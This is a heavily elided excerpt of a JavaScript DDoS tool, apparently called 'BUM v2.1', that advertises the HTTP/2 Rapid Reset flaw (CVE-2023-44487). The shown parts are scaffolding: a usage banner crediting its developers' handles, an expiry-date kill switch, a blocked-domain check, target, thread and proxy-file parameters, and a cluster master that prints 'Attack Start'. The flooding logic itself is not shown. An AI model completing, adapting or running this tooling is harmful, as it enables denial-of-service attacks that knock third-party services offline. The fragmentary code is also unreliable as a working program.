// made by @HanZit aka mitigations for mesh botnet
...
const targetDate = new Date('2050-06-30');
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    BUM v2.1 Method With RST STREAM (CVE-2023-44487) // Updated: 04.05.2024 //
    Developers to method: @resetcve - developer method // @shiftwise - recoding method // @Lintar21- developer method
    How to use & example:
...
if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @HanZit');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg @HanZit`);
    process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    console.log(`Attack Start / @Lintar21 love you <3 / BUM v2.1 (Beta Version)`);
